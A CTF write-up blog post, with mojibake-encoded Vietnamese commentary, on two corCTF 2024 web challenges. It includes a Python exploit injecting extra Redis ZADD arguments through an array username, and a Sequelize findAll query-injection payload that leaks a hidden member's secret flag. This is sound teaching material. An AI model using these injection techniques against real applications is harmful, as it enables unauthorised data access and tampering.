---
title: "CorCTF2024 - WEB 's challenges"
excerpt: "July 27, 2024 07:00 AM ICT to July 29, 2024 07:00 AM ICT"

header:
show_date: true
header:
  teaser: "../assets/images/images-icon/corCTF2024.png"
  teaser_home_page: true
  icon: "https://hackmd.io/_uploads/By3gJwG0h.png"
categories:
  - CTF
tags:
  - CTF
  - Vietnamese
---

<p align="center">
<img src="https://l3mnt2010.github.io/assets/images/images-icon/corCTF2024.png" alt="">
</p>


# WEB challs

## rock-paper-scissors [79 solves]

![image](https://hackmd.io/_uploads/S1ijHFLKA.png)

- M·ªôt chall k√©o - b√∫a - bao v·ªõi nodejs + redis ƒë·ªÉ l∆∞u s·ªë l·∫ßn th·∫Øng c·ªßa ng∆∞·ªùi ch∆°i.

![image](https://hackmd.io/_uploads/S1pGsd8tA.png)

![image](https://hackmd.io/_uploads/rJumj_UtA.png)

### analysis

- Ta s·∫Ω ƒëi v√†o ph·∫ßn t√≠ch c√°c api c·ªßa server:


```
import Redis from 'ioredis';
import fastify from 'fastify';
import fastifyStatic from '@fastify/static';
import fastifyJwt from '@fastify/jwt';
import fastifyCookie from '@fastify/cookie';
import { join } from 'node:path';
import { randomBytes, randomInt } from 'node:crypto';

const redis = new Redis(6379, "redis");
const app = fastify();

const winning = new Map([
	['ü™®', 'üìÉ'],
	['üìÉ', '‚úÇÔ∏è'],
	['‚úÇÔ∏è', 'ü™®']
]);

app.register(fastifyStatic, {
	root: join(import.meta.dirname, 'static'),
	prefix: '/'
});

app.register(fastifyJwt, { secret: process.env.SECRET_KEY || randomBytes(32), cookie: { cookieName: 'session' } });

app.register(fastifyCookie);

await redis.zadd('scoreboard', 1336, 'FizzBuzz101');

app.post('/new', async (req, res) => {
	const { username } = req.body;
	const game = randomBytes(8).toString('hex');
	await redis.set(game, 0);
	return res.setCookie('session', await res.jwtSign({ username, game })).send('OK');
});

app.post('/play', async (req, res) => {
	try {
		await req.jwtVerify();
	} catch(e) {
		return res.status(400).send({ error: 'invalid token' });
	}
	const { game, username } = req.user;
	const { position } = req.body;
	const system = ['ü™®', 'üìÉ', '‚úÇÔ∏è'][randomInt(3)];
	if (winning.get(system) === position) {
		const score = await redis.incr(game);

		return res.send({ system, score, state: 'win' });
	} else {
		const score = await redis.getdel(game);
		if (score === null) {
			return res.status(404).send({ error: 'game not found' });
		}
		await redis.zadd('scoreboard', score, username);
		return res.send({ system, score, state: 'end' });
	}
});

app.get('/scores', async (req, res) => {
	const result = await redis.zrevrange('scoreboard', 0, 99, 'WITHSCORES');
	const scores = [];
	for (let i = 0; i < result.length; i += 2) {
		scores.push([result[i], parseInt(result[i + 1], 10)]);
	}
	return res.send(scores);
});

app.get('/flag', async (req, res) => {
	try {
		await req.jwtVerify();
	} catch(e) {
		return res.status(400).send({ error: 'invalid token' });
	}
	const score = await redis.zscore('scoreboard', req.user.username);
	if (score && score > 1336) {
		return res.send(process.env.FLAG || 'corctf{test_flag}');
	}
	return res.send('You gotta beat Fizz!');
})

app.listen({ host: '0.0.0.0', port: 8080 }, (err, address) => console.log(err ?? `web/rock-paper-scissors listening on ${address}`));
```

- Nh∆∞ ta quan s√°t th√¨ ƒë√∫ng v·ªõi logic b√¨nh th∆∞·ªùng -> t·∫°o new user -> api play -> c√≥ api scores ƒë·ªÉ quan s√°t t·∫•t c·∫£ nh·ªØng ng∆∞·ªùi ch∆°i + ƒëi·ªÉm s·ªë c·ªßa h·ªç.
- V√† khi ƒëi·ªÉm s·ªë c·ªßa ng∆∞·ªùi ch∆°i > 1336 th√¨ s·∫Ω nh·∫≠n `FLAG`.

- H∆∞·ªõng gi·∫£i quy·∫øt m√† m√¨nh nghƒ© ƒë·∫øn ƒë·∫ßu ti√™n l√† truy c·∫≠p v·ªõi user `FizzBuzz101` v√¨ ƒëi·ªÉm s·ªë c·ªßa anh ·∫•y l√† 1336 v√† ta ch·ªâ c·∫ßn win 1 m√†n n·ªØa l√† s·∫Ω ƒë∆∞·ª£c flag nh∆∞ng kh√¥ng may api `/new` ƒë√£ ngƒÉn ch·∫∑n n√≥ l·∫°i -> khi ng∆∞·ªùi ch∆°i t·∫°o m·ªôt game m·ªõi v·ªõi username th√¨ server random ra id c·ªßa game -> set gi√° tr·ªã c·ªßa game ƒë√≥ v·ªõi ƒëi·ªÉm s·ªë l√† 0 ƒë·∫ßu ti√™n -> sau ƒë√≥ m·ªõi t·∫°o ra session v·ªõi jwt.
- Sau m·ªôt h·ªìi research th√¨ c√≥ v·∫ª nh∆∞ kh√¥ng c√≥ b·∫•t k√¨ bug g√¨ ƒë·∫øn t·ª´ c√°c th∆∞ vi·ªán ƒëang ƒë∆∞·ª£c d√πng.
- Ta c√πng ph√¢n t√≠ch r√µ h∆°n api `/play`:

```
app.post('/play', async (req, res) => {
	try {
		await req.jwtVerify();
	} catch(e) {
		return res.status(400).send({ error: 'invalid token' });
	}
	const { game, username } = req.user;
	const { position } = req.body;
	const system = ['ü™®', 'üìÉ', '‚úÇÔ∏è'][randomInt(3)];
	if (winning.get(system) === position) {
		const score = await redis.incr(game);

		return res.send({ system, score, state: 'win' });
	} else {
		const score = await redis.getdel(game);
		if (score === null) {
			return res.status(404).send({ error: 'game not found' });
		}
		await redis.zadd('scoreboard', score, username);
		return res.send({ system, score, state: 'end' });
	}
});

```

- V·ªõi method post m√† client g·ª≠i ƒë·∫øn tr∆∞·ªõc ti√™n th√¨ server s·∫Ω check session v·ªõi jwt middleware v·ªõi th√≠ch h·ª£p t·ª´ `@fastify/jwt` -> n·∫øu v∆∞·ª£t qua th√¨ nh·∫≠n gi√° tr·ªã `game` & `username` ƒë∆∞·ª£c x·ª≠ l√≠ ·ªü middlware tr·∫£ ra -> nh·∫≠n position -> sau ƒë√≥ s·∫Ω ti·∫øn h√†nh random ra 1 trong 3 gi√° tr·ªã k√©o - b√∫a - bao -> n·∫øu ng∆∞·ªùi ch∆°i ch·ªçn k·∫øt qu·∫£ th·∫Øng khi m√† h·ªá th·ªëng random th√¨ d√πng h√†m `redis.incr` tƒÉng gi√° tr·ªã ƒëi·ªÉm l∆∞u trong redis v·ªõi game hi·ªán t·∫°i l√™n 1 point -> tr·∫£ ra gi√° tr·ªã ƒëi·ªÉm, ... -> ng∆∞·ª£c l·∫°i n·∫øu thua th√¨ s·∫Ω `redis.getdel` reset point c·ªßa game v·ªÅ 0 -> g·ªçi `redis.zadd('scoreboard', score, username);` -> tr·∫£ v·ªÅ c√°c gi√° tr·ªã t∆∞∆°ng t·ª±.

- V√† bug ·ªü ƒë√¢y n·∫±m ·ªü `redis.zadd('scoreboard', score, username);` anh `Nam` trong team ƒë√£ seaching ra.

![image](https://hackmd.io/_uploads/BkR1QdIYC.png)

- Nh∆∞ h√¨nh c√≥ th·ªÉ th·∫•y l√† ta c√≥ th·ªÉ truy·ªÅn nhi·ªÅu ƒë·ªëi s·ªë cho n√≥ v√† khi ƒë√≥ redis s·∫Ω l∆∞u n√≥ l√† c√°c key v√† value m·ªõi v√†o ``sorted set "scoreboard"``

```
PS D:\ctf_chall\corCTF2024\rock-paper-scissors> docker ps
CONTAINER ID   IMAGE                       COMMAND                  CREATED         STATUS         PORTS                     NAMES
df2a46d93e8e   rock-paper-scissors-chall   "docker-entrypoint.s‚Ä¶"   3 minutes ago   Up 3 minutes   0.0.0.0:8080->8080/tcp    rock-paper-scissors-chall-1
0828e098ad05   redis                       "docker-entrypoint.s‚Ä¶"   3 minutes ago   Up 3 minutes   0.0.0.0:60940->6379/tcp   rock-paper-scissors-redis-1
PS D:\ctf_chall\corCTF2024\rock-paper-scissors> docker inspect 0828e098ad05
[
    {
        "Id": "0828e098ad05d9f2d42c2bb8421ae14fad2ddfa01b4cd9ff942060a073e7e88d",
        "Created": "2024-07-30T14:17:28.564934924Z",
        "Path": "docker-entrypoint.sh",
        "Args": [
            "redis-server"
        ],
        "State": {
            "Status": "running",
            "Running": true,
            "Paused": false,
            "Restarting": false,
            "OOMKilled": false,
            "Dead": false,
            "Pid": 603,
            "ExitCode": 0,
            "Error": "",
            "StartedAt": "2024-07-30T14:17:29.623337834Z",
            "FinishedAt": "0001-01-01T00:00:00Z"
        },
        "Image": "sha256:509b2fc82da65579aa63481c5b4909d1d777040ea574bf4be7aa1d6d48bf4b5f",
        "ResolvConfPath": "/var/lib/docker/containers/0828e098ad05d9f2d42c2bb8421ae14fad2ddfa01b4cd9ff942060a073e7e88d/resolv.conf",
        "HostnamePath": "/var/lib/docker/containers/0828e098ad05d9f2d42c2bb8421ae14fad2ddfa01b4cd9ff942060a073e7e88d/hostname",
        "HostsPath": "/var/lib/docker/containers/0828e098ad05d9f2d42c2bb8421ae14fad2ddfa01b4cd9ff942060a073e7e88d/hosts",
        "LogPath": "/var/lib/docker/containers/0828e098ad05d9f2d42c2bb8421ae14fad2ddfa01b4cd9ff942060a073e7e88d/0828e098ad05d9f2d42c2bb8421ae14fad2ddfa01b4cd9ff942060a073e7e88d-json.log",
        "Name": "/rock-paper-scissors-redis-1",
        "RestartCount": 0,
        "Driver": "overlay2",
        "Platform": "linux",
        "MountLabel": "",
        "ProcessLabel": "",
        "AppArmorProfile": "",
        "ExecIDs": [
            "ae2fd5e17736021cf9032d4720e46801ff0426b8d42b99b10c5bee51449d7c7e"
        ],
        "HostConfig": {
            "Binds": null,
            "ContainerIDFile": "",
            "LogConfig": {
                "Type": "json-file",
                "Config": {}
            },
            "NetworkMode": "rock-paper-scissors_default",
            "PortBindings": {
                "6379/tcp": [
                    {
                        "HostIp": "0.0.0.0",
                        "HostPort": "0"
                    }
                ]
            },
            "RestartPolicy": {
                "Name": "no",
                "MaximumRetryCount": 0
            },
            "AutoRemove": false,
            "VolumeDriver": "",
            "VolumesFrom": null,
            "ConsoleSize": [
                0,
                0
            ],
            "CapAdd": null,
            "CapDrop": null,
            "CgroupnsMode": "host",
            "Dns": null,
            "DnsOptions": null,
            "DnsSearch": null,
            "ExtraHosts": [],
            "GroupAdd": null,
            "IpcMode": "private",
            "Cgroup": "",
            "Links": null,
            "OomScoreAdj": 0,
            "PidMode": "",
            "Privileged": false,
            "PublishAllPorts": false,
            "ReadonlyRootfs": false,
            "SecurityOpt": null,
            "UTSMode": "",
            "UsernsMode": "",
            "ShmSize": 67108864,
            "Runtime": "runc",
            "Isolation": "",
            "CpuShares": 0,
            "Memory": 0,
            "NanoCpus": 0,
            "CgroupParent": "",
            "BlkioWeight": 0,
            "BlkioWeightDevice": null,
            "BlkioDeviceReadBps": null,
            "BlkioDeviceWriteBps": null,
            "BlkioDeviceReadIOps": null,
            "BlkioDeviceWriteIOps": null,
            "CpuPeriod": 0,
            "CpuQuota": 0,
            "CpuRealtimePeriod": 0,
            "CpuRealtimeRuntime": 0,
            "CpusetCpus": "",
            "CpusetMems": "",
            "Devices": null,
            "DeviceCgroupRules": null,
            "DeviceRequests": null,
            "MemoryReservation": 0,
            "MemorySwap": 0,
            "MemorySwappiness": null,
            "OomKillDisable": false,
            "PidsLimit": null,
            "Ulimits": null,
            "CpuCount": 0,
            "CpuPercent": 0,
            "IOMaximumIOps": 0,
            "IOMaximumBandwidth": 0,
            "MaskedPaths": [
                "/proc/asound",
                "/proc/acpi",
                "/proc/kcore",
                "/proc/keys",
                "/proc/latency_stats",
                "/proc/timer_list",
                "/proc/timer_stats",
                "/proc/sched_debug",
                "/proc/scsi",
                "/sys/firmware",
                "/sys/devices/virtual/powercap"
            ],
            "ReadonlyPaths": [
                "/proc/bus",
                "/proc/fs",
                "/proc/irq",
                "/proc/sys",
                "/proc/sysrq-trigger"
            ]
        },
        "GraphDriver": {
            "Data": {
                "LowerDir": "/var/lib/docker/overlay2/0956a84f784478349b2b35ea9dd484f71640af4548951559e7dc94d996678f16-init/diff:/var/lib/docker/overlay2/946debb1c227499ed133261a8350b777051fc45e5ba8b6227fac8038b708a80b/diff:/var/lib/docker/overlay2/702e82dca889d22c0c13c1a0c3cdab75734cf61ca29a337f83dcf569c6bfa222/diff:/var/lib/docker/overlay2/c551b2d402dcdbedf4473365d972141221f004b7e6db13383fc0c9a4ce4ebd2c/diff:/var/lib/docker/overlay2/2b0b940379a57ef9e97145b23cb3d4d857ba7abbdbdccacc2e586c2ffe912cf4/diff:/var/lib/docker/overlay2/c4e1fdeb08461fd9958864b572dd18151b05d51acca9b9d428cb504642f9f831/diff:/var/lib/docker/overlay2/44a0bbfacb80080501b45ae78d2a0e54ed59171039bcbe1e7f6604e988ac4316/diff:/var/lib/docker/overlay2/ce06eacfcad13e2e0dbdc1cf9f4d7bbe906a6d37e5bcd97932b05321b4bf1dff/diff:/var/lib/docker/overlay2/defd33130a0d2062af3c9d7ecad24f4681d67947521aa6bd7f5405d6b42120b7/diff",
                "MergedDir": "/var/lib/docker/overlay2/0956a84f784478349b2b35ea9dd484f71640af4548951559e7dc94d996678f16/merged",
                "UpperDir": "/var/lib/docker/overlay2/0956a84f784478349b2b35ea9dd484f71640af4548951559e7dc94d996678f16/diff",
                "WorkDir": "/var/lib/docker/overlay2/0956a84f784478349b2b35ea9dd484f71640af4548951559e7dc94d996678f16/work"
            },
            "Name": "overlay2"
        },
        "Mounts": [
            {
                "Type": "volume",
                "Name": "2f4aff134e0a7d51270d3aedd48d82ebeddffe1dd4453cc06a90f49f5e2b2f09",
                "Source": "/var/lib/docker/volumes/2f4aff134e0a7d51270d3aedd48d82ebeddffe1dd4453cc06a90f49f5e2b2f09/_data",
                "Destination": "/data",
                "Driver": "local",
                "Mode": "",
                "RW": true,
                "Propagation": ""
            }
        ],
        "Config": {
            "Hostname": "0828e098ad05",
            "Domainname": "",
            "User": "",
            "AttachStdin": false,
            "AttachStdout": true,
            "AttachStderr": true,
            "ExposedPorts": {
                "6379/tcp": {}
            },
            "Tty": false,
            "OpenStdin": false,
            "StdinOnce": false,
            "Env": [
                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                "GOSU_VERSION=1.17",
                "REDIS_VERSION=7.4.0",
                "REDIS_DOWNLOAD_URL=http://download.redis.io/releases/redis-7.4.0.tar.gz",
                "REDIS_DOWNLOAD_SHA=57b47c2c6682636d697dbf5d66d8d495b4e653afc9cd32b7adf9da3e433b8aaf"
            ],
            "Cmd": [
                "redis-server"
            ],
            "Image": "redis",
            "Volumes": {
                "/data": {}
            },
            "WorkingDir": "/data",
            "Entrypoint": [
                "docker-entrypoint.sh"
            ],
            "OnBuild": null,
            "Labels": {
                "com.docker.compose.config-hash": "576e5b3fdcf6ba4fa5287347812fae6e0b976d28cef9147629de74465af9a191",
                "com.docker.compose.container-number": "1",
                "com.docker.compose.depends_on": "",
                "com.docker.compose.image": "sha256:509b2fc82da65579aa63481c5b4909d1d777040ea574bf4be7aa1d6d48bf4b5f",
                "com.docker.compose.oneoff": "False",
                "com.docker.compose.project": "rock-paper-scissors",
                "com.docker.compose.project.config_files": "D:\\ctf_chall\\corCTF2024\\rock-paper-scissors\\docker-compose.yml",
                "com.docker.compose.project.working_dir": "D:\\ctf_chall\\corCTF2024\\rock-paper-scissors",
                "com.docker.compose.service": "redis",
                "com.docker.compose.version": "2.28.1"
            }
        },
        "NetworkSettings": {
            "Bridge": "",
            "SandboxID": "95a17f02a170390891788b5b5925113de8386e7e99c00d2cf2205fafbde5783a",
            "SandboxKey": "/var/run/docker/netns/95a17f02a170",
            "Ports": {
                "6379/tcp": [
                    {
                        "HostIp": "0.0.0.0",
                        "HostPort": "60940"
                    }
                ]
            },
            "HairpinMode": false,
            "LinkLocalIPv6Address": "",
            "LinkLocalIPv6PrefixLen": 0,
            "SecondaryIPAddresses": null,
            "SecondaryIPv6Addresses": null,
            "EndpointID": "",
            "Gateway": "",
            "GlobalIPv6Address": "",
            "GlobalIPv6PrefixLen": 0,
            "IPAddress": "",
            "IPPrefixLen": 0,
            "IPv6Gateway": "",
            "MacAddress": "",
            "Networks": {
                "rock-paper-scissors_default": {
                    "IPAMConfig": null,
                    "Links": null,
                    "Aliases": [
                        "rock-paper-scissors-redis-1",
                        "redis"
                    ],
                    "MacAddress": "02:42:ac:12:00:02",
                    "DriverOpts": null,
                    "NetworkID": "26f514ba6e1d52d8bf91331a16cb438b90ce1ae95be9c7cc850bba1b087c345f",
                    "EndpointID": "0fcc5c9e0d7da7a5987376a377439819d5684dc0248d3eb46d5c64b345af1801",
                    "Gateway": "172.18.0.1",
                    "IPAddress": "172.18.0.2",
                    "IPPrefixLen": 16,
                    "IPv6Gateway": "",
                    "GlobalIPv6Address": "",
                    "GlobalIPv6PrefixLen": 0,
                    "DNSNames": [
                        "rock-paper-scissors-redis-1",
                        "redis",
                        "0828e098ad05"
                    ]
                }
            }
        }
    }
]
```

- Ta s·∫Ω t·∫°o username v·ªõi api `/new` ƒë·ªÉ xem nh·ªØng g√¨ ƒë√£ di·ªÖn ra n·∫øu ta truy·ªÅn nhi·ªÅu ƒë·ªëi s·ªë v·ªõi redis.


```
l3mnt2010@ASUSEXPERTBOOK:~$ curl -X POST -H "Content-Type: application/json" -d '{"username": ["lam","\n", "scoreboard", 1337, "gaga"]}' http://localhost:8080/new
OK
```

poc: 

```
l3mnt2010@ASUSEXPERTBOOK:~/corCTF2024/rock-paper-scissors$ python3 exp.py
corctf{test_flag}
l3mnt2010@ASUSEXPERTBOOK:~/corCTF2024/rock-paper-scissors$ cat exp.py
import requests

HOST = 'http://localhost:8080'
sess = requests.Session()

exfil_username = 'mixi'
r = sess.post(HOST + '/new', json={'username': ['lam', 1337, exfil_username]})
r = sess.post(HOST + '/play', json={'position': "a"})
r = sess.post(HOST + '/new', json={'username': exfil_username})
flag = sess.get(HOST + '/flag').text
print(flag)
l3mnt2010@ASUSEXPERTBOOK:~/corCTF2024/rock-paper-scissors$
```

- ƒê√¢y l√† c√°c h√†nh ƒë·ªông m√† ƒë∆∞·ª£c redis x·ª≠ l√≠ khi ta truy·ªÅn nhi·ªÅu ƒë·ªëi s·ªë:

```
PS D:\ctf_chall\corCTF2024\rock-paper-scissors> rdcli -h 127.0.0.1 -p 60940
127.0.0.1:60940>
127.0.0.1:60940> MONITOR
OK

127.0.0.1:60940> 1722351217.998199 [0 172.18.0.3:58266] "set" "1ce29c3d35e8be24" "0"
1722351251.694706 [0 172.18.0.3:58266] "set" "5c653d17782fd9ef" "0"
1722351258.780213 [0 172.18.0.3:58266] "zrevrange" "scoreboard" "0" "99" "WITHSCORES"
1722351261.011568 [0 172.18.0.3:58266] "zrevrange" "scoreboard" "0" "99" "WITHSCORES"
1722351446.656598 [0 172.18.0.3:58266] "set" "d8d255e5554c75d8" "0"
1722351446.730496 [0 172.18.0.3:58266] "getdel" "d8d255e5554c75d8"
1722351446.737365 [0 172.18.0.3:58266] "zadd" "scoreboard" "0" "lam" "1337" "mixi"
1722351446.752457 [0 172.18.0.3:58266] "set" "bf5ec5ad0a5bb51d" "0"
1722351446.768182 [0 172.18.0.3:58266] "zscore" "scoreboard" "mixi"

```

ƒê√∫ng nh∆∞ m·ª•c ƒë√≠ch ta c√≥ th·ªÉ th·∫•y:

- ƒê·∫ßu ti√™n th√¨ m√¨nh t·∫°o user v·ªõi api `/new` sau ƒë√≥ server t·∫°o game v√† l∆∞u v√†o redis `"set" "d8d255e5554c75d8" "0"`
- Ti·∫øp theo l√† g·ªçi api `/play` v√† ƒë·ªÉ ch∆°i ch·∫Øc ch·∫Øn sai th√¨ m√¨nh g·ª≠i position sai -> l√∫c n√†y redis s·∫Ω g·ªçi method `getdel` `"getdel" "d8d255e5554c75d8"` -> sau ƒë√≥ g·ªçi `zadd`: `"zadd" "scoreboard" "0" "lam" "1337" "mixi"` -> l√∫c n√†y th√¨ username `mixi` ƒë√£ ƒë∆∞·ª£c add v·ªõi score l√† 1337 v√†o `sorted set "scoreboard"`.
![image](https://hackmd.io/_uploads/rJ7mmFIKA.png)


### exploit real server

```
l3mnt2010@ASUSEXPERTBOOK:~/corCTF2024/rock-paper-scissors$ python3 exp.py
corctf{lizard_spock!_a8cd3ad8ee2cde42}
```

### Notes

- Sau b√†i n√†y m√¨nh m·ªõi r√∫t ra m·ªôt v√†i l·ªói analysis c·ªßa m√¨nh l√† sorted set "scoreboard" m·ªõi l√† ƒë·ªÉ ki·ªÉm tra khi l·∫•y flag ch·ª© kh√¥ng ph·∫£i ki·ªÉm tra ƒëi·ªÉm c·ªßa game.
- V·∫•n ƒë·ªÅ ƒë·ªçc ch∆∞a kƒ© flow l√† server t·∫°o game -> user ch∆°i game -> ƒëi·ªÉm c·ªßa game ƒë√≥ s·∫Ω ƒë∆∞·ª£c add v√†o `scoreboard` trong redis ch·ª© kh√¥ng ph·∫£i l√† l·∫•y ƒëi·ªÉm cao nh·∫•t c·ªßa user v√† c·ªông v√†o.

flag: `corctf{lizard_spock!_a8cd3ad8ee2cde42}`


## erm [60 solves]

![image](https://hackmd.io/_uploads/HJ3UtY8KA.png)


- ƒê·∫øn v·ªõi m·ªôt chall nodejs + orm Sequelize + sqlite database.

V√¨ ƒë·ªÅ b√†i cho source n√™n ta s·∫Ω ƒëi ph√¢n t√≠ch lu√¥n c√°c api c·ªßa server.

### analysis

```
const express = require("express");
const hbs = require("hbs");

const app = express();

const db = require("./db.js");

const PORT = process.env.PORT || 5000;

app.set("view engine", "hbs");

// catches async errors and forwards them to error handler
// https://stackoverflow.com/a/51391081
const wrap = fn => (req, res, next) => {
    return Promise
        .resolve(fn(req, res, next))
        .catch(next);
};

app.get("/api/members", wrap(async (req, res) => {
    res.json({ members: (await db.Member.findAll({ include: db.Category, where: { kicked: false } })).map(m => m.toJSON()) });
}));

app.get("/api/writeup/:slug", wrap(async (req, res) => {
    const writeup = await db.Writeup.findOne({ where: { slug: req.params.slug }, include: db.Member });
    if (!writeup) return res.status(404).json({ error: "writeup not found" });
    res.json({ writeup: writeup.toJSON() });
}));

app.get("/api/writeups", wrap(async (req, res) => {
    res.json({ writeups: (await db.Writeup.findAll(req.query)).map(w => w.toJSON()).sort((a,b) => b.date - a.date) });
}));

app.get("/writeup/:slug", wrap(async (req, res) => {
    res.render("writeup");
}));

app.get("/writeups", wrap(async (req, res) => res.render("writeups")));

app.get("/members", wrap(async (req, res) => res.render("members")));

app.get("/", (req, res) => res.render("index"));

app.use((err, req, res, next) => {
    console.log(err);
    res.status(500).send('An error occurred');
});

app.listen(PORT, () => console.log(`web/erm listening on port ${PORT}`));
```

- Trang web kh√° `c·∫ßu k√¨` d√πng ƒë·ªÉ hi·ªÉn th·ªã member + writeup cho team ch∆°i CTF kh√° ph·ªï bi·∫øn c√≥ s·ª≠ d·ª•ng template handlerbar.

- Nh∆∞ ta th·∫•y ·ªü tr√™n th√¨ `/` s·∫Ω hi·ªÉn th·ªã trang index,`/members` s·∫Ω hi·ªÉn th·ªã `members` v√† trong n√†y l·∫°i g·ªçi api `/api/members` ƒë·ªÉ hi·ªÉn th·ªã c√°c member c·ªßa team tr·ª´ th√†nh vi√™n ƒë√£ b·ªã `kicked`, `/writeups` t∆∞∆°ng t·ª± s·∫Ω g·ªçi api `/api/writeups` ƒë·ªÉ hi√™n th·ªã danh s√°ch t·∫•t c·∫£ c√°c write up qua c√°c gi·∫£i CTF, `/writeup/:slug` s·∫Ω hi·ªÉn th·ªã writeup detail qua vi·ªác g·ªçi `/api/writeup/:slug`

- V·∫≠y th√¨ ƒë·ªÉ √Ω FLAG tr∆∞·ªõc ƒë√£ -> flag n·∫±m ·ªü `db.js` ƒë√¢y l√† n∆°i init c√°c method v√† truy v·∫•n li√™n quan ƒë·∫øn database.

```
    const { Sequelize, DataTypes, Op } = require('sequelize');
    const slugify = require('slugify');
    const { rword } = require('rword');

    const sequelize = new Sequelize({
        dialect: 'sqlite',
        storage: 'erm.db',
        logging: false
    });  

    const Category = sequelize.define('Category', {
        name: {
            type: DataTypes.STRING,
            primaryKey: true,
            allowNull: false,
        }
    });

    const Member = sequelize.define('Member', {
        username: {
            type: DataTypes.STRING,
            primaryKey: true,
            allowNull: false,
        },
        secret: {
            type: DataTypes.STRING,
        },
        kicked: {
            type: DataTypes.BOOLEAN,
            defaultValue: false,
        }
    });

    const Writeup = sequelize.define('Writeup', {
        title: {
            type: DataTypes.STRING,
            allowNull: false
        },
        slug: {
            type: DataTypes.STRING,
            allowNull: false,
        },
        content: {
            type: DataTypes.TEXT,
            allowNull: false
        },
        date: {
            type: DataTypes.DATE,
            allowNull: false
        },
        category: {
            type: DataTypes.STRING,
        }
    });

    Category.belongsToMany(Member, { through: 'MemberCategory' });
    Member.belongsToMany(Category, { through: 'MemberCategory' });
    Member.hasMany(Writeup);
    Writeup.belongsTo(Member);

    sequelize.sync().then(async () => {
        const writeupCount = await Writeup.count();
        if (writeupCount !== 0) return;
        console.log("seeding db with default data...");

        const categories = ["web", "pwn", "rev", "misc", "crypto", "forensics"];
        const members = [
            { username: "FizzBuzz101", categories: ["pwn", "rev"] },
            { username: "strellic", categories: ["web", "misc"] },
            { username: "EhhThing", categories: ["web", "misc"] },
            { username: "drakon", categories: ["web", "misc"], },
            { username: "ginkoid", categories: ["web", "misc"], },
            { username: "jazzpizazz", categories: ["web", "misc"], },
            { username: "BrownieInMotion", categories: ["web", "rev"] },
            { username: "clubby", categories: ["pwn", "rev"] },
            { username: "pepsipu", categories: ["pwn", "crypto"] },
            { username: "chop0", categories: ["pwn"] },
            { username: "ryaagard", categories: ["pwn"] },
            { username: "day", categories: ["pwn", "crypto"] },
            { username: "willwam845", categories: ["crypto"] },
            { username: "quintec", categories: ["crypto", "misc"] },
            { username: "anematode", categories: ["rev"] },
            { username: "0x5a", categories: ["pwn"] },
            { username: "emh", categories: ["crypto"] },
            { username: "jammy", categories: ["misc", "forensics"] },
            { username: "pot", categories: ["crypto"] },
            { username: "plastic", categories: ["misc", "forensics"] },
        ];

        for (const category of categories) {
            await Category.create({ name: category });
        }

        for (const member of members) {
            const m = await Member.create({ username: member.username });
            for (const category of member.categories) {
                const c = await Category.findOne({ where: { name: category } });
                await m.addCategory(c);
                await c.addMember(m);
            }
        }

        // the forbidden member
        // banned for leaking our solve scripts
        const goroo = await Member.create({ username: "goroo", secret: process.env.FLAG || "corctf{test_flag}", kicked: true });
        const web = await Category.findOne({ where: { name: "web" } });
        await goroo.addCategory(web);
        await web.addMember(    );

        for (let i = 0; i < 25; i++) {
            const challCategory = categories[Math.floor(Math.random() * categories.length)];
            const date = new Date(Math.floor(Math.random() * 4) + 2020, Math.floor(Math.random() * 12), Math.floor(Math.random() * 31) + 1);

            // most CTFs feel like they're just named with random words anyway
            const ctfName = `${rword.generate(1, { capitalize: 'first', length: '4-6' })}CTF ${date.getFullYear()}`;
            // same thing with challenge names
            const challName = `${challCategory}/${rword.generate(1)}`;

            const title = `${ctfName} - ${challName} Writeup`;
            const content = rword.generate(1, { capitalize: 'first'}) + " " + rword.generate(500).join(" ") + ".<br /><br />Thanks for reading!<br /><br />";
            
            const writeup = await Writeup.create({ title, content, date, slug: slugify(title, { lower: true }), category: challCategory });
            const authors = members.filter(m => m.categories.includes(challCategory));
            const author = await Member.findByPk(authors[Math.floor(Math.random() * authors.length)].username);

            await writeup.setMember(author);
            await author.addWriteup(writeup);
        }
    });

    module.exports = { Category, Member, Writeup };
```

    - V·ªõi orm sequelize server kh·ªüi t·∫°o b·∫£ng `Categorys` ch·ª©a t√™n c√°c m·∫£ng trong CTF, `Members` ch·ª©a member, `Writeups` ch·ª©a c√°c write up c·ªßa team -> kh·ªüi t·∫°o c√°c relationship t∆∞∆°ng ·ª©ng -> ti·∫øp sau ƒë√≥ insert c√°c member sau ƒë√≥ t·∫°o ra write-up random.
- V√† flag l√† secret c·ªßa user goroo l√† flag:

```
const goroo = await Member.create({ username: "goroo", secret: process.env.FLAG || "corctf{test_flag}", kicked: true });
        const web = await Category.findOne({ where: { name: "web" } });
        await goroo.addCategory(web);
        await web.addMember(goroo);
```
- ·ªü ƒë√¢y `kicked` l√† true v√¨ v·∫≠y cho n√™n ta c√≥ th·ªÉ hi·ªÉu ƒë∆∞·ª£c l√≠ do khi api member l·∫°i kh√¥ng c√≥ user n√†y.

- C√≥ 2 api m√† ch√∫ng ta c√≥ th·ªÉ truy·ªÅn ƒë·∫ßu v√†o ·ªü 2 api n√†y:

```
app.get("/api/writeup/:slug", wrap(async (req, res) => {
    const writeup = await db.Writeup.findOne({ where: { slug: req.params.slug }, include: db.Member });
    if (!writeup) return res.status(404).json({ error: "writeup not found" });
    res.json({ writeup: writeup.toJSON() });
}));

app.get("/api/writeups", wrap(async (req, res) => {
    res.json({ writeups: (await db.Writeup.findAll(req.query)).map(w => w.toJSON()).sort((a,b) => b.date - a.date) });
}));
```

### exploit

- Ch√∫ √Ω ƒëi·ªÉm n·ªïi b·∫≠t l√† ·ªü `/api/writeups` t·∫°i sao l·∫°i truy·ªÅn c·∫£ req.query v√†o method c·ªßa sequelize v√† anh H·∫≠u v√† anh Nam ƒë√£ t√¨m ra solution cho chall n√†y theo nh∆∞ trong doc n√†y [link](https://sequelize.org/api/v6/class/src/model.js~model#static-method-findAll)

poc: `include[all]=All&include[where][username]=goroo&include[or]=1` ·ªü ƒë√¢y ƒëi·ªÅu ki·ªán l√† s·∫Ω bao g·ªìm t·∫•t c·∫£ c√°c relationship li√™n quan ƒë·∫øn b·∫£ng Writeups v·ªõi ƒëi·ªÅu ki·ªán l√† username = `goroo` v√† m·∫•u ch·ªët ·ªü ƒë√¢y l√† ta s·∫Ω chuy·ªÉn ƒëi·ªÅu ki·ªán or:

![image](https://hackmd.io/_uploads/HkrjIi8t0.png)

![image](https://hackmd.io/_uploads/S18PujUKC.png)


- ·ªü ƒë√¢y th√¨ or 1 l√† true s·∫Ω lu√¥n ƒë√∫ng v√† tr·∫£ ra k·∫øt qu·∫£.

